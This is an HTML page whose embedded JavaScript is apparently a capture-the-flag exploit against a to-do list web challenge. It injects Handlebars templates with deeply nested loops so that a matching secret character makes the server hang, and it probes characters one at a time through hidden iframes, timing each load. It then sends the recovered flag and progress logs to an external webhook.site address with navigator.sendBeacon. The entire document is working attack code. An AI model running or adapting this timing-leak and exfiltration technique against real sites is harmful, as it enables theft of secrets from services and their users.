<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>.</title></head><body>
<pre id="log"></pre>
<script>
const TARGET  = "https://todolist.challs.srdnlen.it";
const WEBHOOK = "https://webhook.site/591468f2-6ec6-4310-a0b1-0837b7ef0608";
const PREFIX  = "srdnlen{";
const CHARSET = "abcdefghijklmnopqrstuvwxyz_0123456789}";
const ARRLEN  = 11;
const DEPTH   = 7;
const P_TO    = 3000;   // ms — match will hang this long
const BUDGET  = 54000;

const ARR  = JSON.stringify(Array.from({length:ARRLEN},(_,i)=>i));
const OPEN = "{{#each @root.arr}}".repeat(DEPTH);
const CLOS = "{{/each}}".repeat(DEPTH);

const logEl = document.getElementById("log");
function print(msg) {
  logEl.textContent += msg + "\n";
  navigator.sendBeacon(`${WEBHOOK}?log=${encodeURIComponent(msg)}`);
}

function makeUrl(pos, ch) {
  const tpl = `{{#if (eq (lookup secret ${pos}) "${ch}")}}${OPEN}X${CLOS}{{/if}}`;
  return TARGET + "/?data=" + encodeURIComponent(`{"arr":${ARR}}`)
       + "&template=" + encodeURIComponent(tpl);
}

// Probe ONE char — returns {dt, reason}
function probeSingle(pos, ch, timeout) {
  return new Promise(resolve => {
    const f  = document.createElement("iframe");
    f.style  = "width:1px;height:1px;position:fixed;top:-9999px;left:-9999px";
    let done = false;
    const t0 = Date.now();

    function finish(reason) {
      if (done) return;
      done = true;
      clearTimeout(tid);
      try { f.src = "about:blank"; f.remove(); } catch(e) {}
      resolve({ dt: Date.now()-t0, reason });
    }

    const tid = setTimeout(() => finish("timeout"), timeout);
    f.onload  = () => finish("load");
    f.onerror = () => finish("error");
    f.src = makeUrl(pos, ch);
    document.body.appendChild(f);
  });
}

// Probe chars in small parallel batches of BATCH_SIZE
// Avoids Chrome connection limit stalling
const BATCH_SIZE = 6;

async function probeAllBatched(pos) {
  const chars   = CHARSET.split("");
  const results = {};

  for (let i = 0; i < chars.length; i += BATCH_SIZE) {
    const batch = chars.slice(i, i + BATCH_SIZE);

    // Hard deadline: if any iframe in batch stalls, move on after P_TO+500ms
    const batchPromise = Promise.all(
      batch.map(ch => probeSingle(pos, ch, P_TO).then(r => { results[ch] = r; }))
    );
    const deadline = new Promise(r => setTimeout(r, P_TO + 500));
    await Promise.race([batchPromise, deadline]);

    // Fill any missing (stalled) chars
    batch.forEach(ch => {
      if (!(ch in results)) results[ch] = { dt: P_TO, reason: "stall" };
    });

    // Early exit if we found a timeout in this batch
    const hit = batch.find(ch => results[ch].reason === "timeout");
    if (hit) {
      // Fill remaining chars as skipped
      chars.slice(i + BATCH_SIZE).forEach(ch => {
        results[ch] = { dt: 0, reason: "skipped" };
      });
      break;
    }
  }

  return results;
}

async function run() {
  const t0 = Date.now();
  let flag = PREFIX;
  print(`[start] prefix=${flag}`);

  for (let pos = PREFIX.length; pos < 60; pos++) {
    const elapsed = Date.now() - t0;
    if (elapsed > BUDGET) {
      print(`[budget] stopped at pos=${pos} elapsed=${elapsed}ms`);
      navigator.sendBeacon(`${WEBHOOK}?BUDGET&flag=${encodeURIComponent(flag)}`);
      break;
    }

    print(`[pos ${pos}] scanning... elapsed=${elapsed}ms`);

    const results = await probeAllBatched(pos);

    // Sort by dt descending, show top results
    const ranked = Object.entries(results)
      .map(([ch, r]) => ({ ch, ...r }))
      .filter(r => r.reason !== "skipped")
      .sort((a, b) => b.dt - a.dt);

    const top5 = ranked.slice(0,5).map(r=>`'${r.ch}'=${r.dt}ms(${r.reason})`).join(" | ");
    print(`[pos ${pos}] ${top5}`);

    const timeouts = ranked.filter(r => r.reason === "timeout" || r.reason === "stall");

    let hitChar = null;

    if (timeouts.length === 1) {
      hitChar = timeouts[0].ch;
      print(`[HIT] pos=${pos} char='${hitChar}' clean timeout`);
    } else if (timeouts.length > 1) {
      // Verify each timeout candidate solo
      print(`[VERIFY] ${timeouts.length} candidates: ${timeouts.map(r=>r.ch).join(",")}`);
      for (const r of timeouts) {
        const v = await probeSingle(pos, r.ch, P_TO);
        print(`[VERIFY] '${r.ch}' solo=${v.dt}ms ${v.reason}`);
        if (v.reason === "timeout") { hitChar = r.ch; break; }
      }
    } else {
      // No timeout — ratio heuristic
      const loaded = ranked.filter(r => r.reason === "load");
      if (loaded.length >= 2 && loaded[0].dt > 600) {
        const ratio = loaded[0].dt / Math.max(1, loaded[1].dt);
        if (ratio > 3.0) {
          hitChar = loaded[0].ch;
          print(`[HIT-ratio] pos=${pos} char='${hitChar}' ratio=${ratio.toFixed(1)}x`);
        }
      }
    }

    if (hitChar) {
      flag += hitChar;
      print(`[FLAG] ${flag}`);
      navigator.sendBeacon(`${WEBHOOK}?FLAG=${encodeURIComponent(flag)}`);
      if (hitChar === "}") break;
    } else {
      print(`[MISS] pos=${pos} — stopping`);
      navigator.sendBeacon(`${WEBHOOK}?MISS&pos=${pos}&flag=${encodeURIComponent(flag)}`);
      break;
    }
  }

  print(`[DONE] ${flag} total=${Date.now()-t0}ms`);
  navigator.sendBeacon(`${WEBHOOK}?DONE&flag=${encodeURIComponent(flag)}`);
}

run();
</script>
</body></html>
